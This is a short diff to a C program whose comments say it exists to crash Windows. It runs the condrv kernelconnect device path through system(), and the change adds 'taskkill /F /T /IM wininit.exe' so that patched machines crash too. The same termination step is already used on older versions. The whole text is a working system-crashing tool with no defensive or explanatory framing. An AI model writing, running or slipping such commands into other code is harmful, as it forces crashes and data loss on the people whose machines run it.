@@ -8,6 +8,8 @@ int main() {
     if (IsWindows7OrGreater() == 1) {
         //Let's crash the computer using the \\.\globalroot\device\condrv\kernelconnect method.
         system("\\\\.\\globalroot\\device\\condrv\\kernelconnect");
+        //To make sure that it crashes patched versions, terminate wininit.exe.
+        system("taskkill /F /T /IM wininit.exe");
     } else if (IsWindowsXPOrGreater() == 1) {
         //Let's terminate wininit.exe
         system("taskkill /F /T /IM wininit.exe");
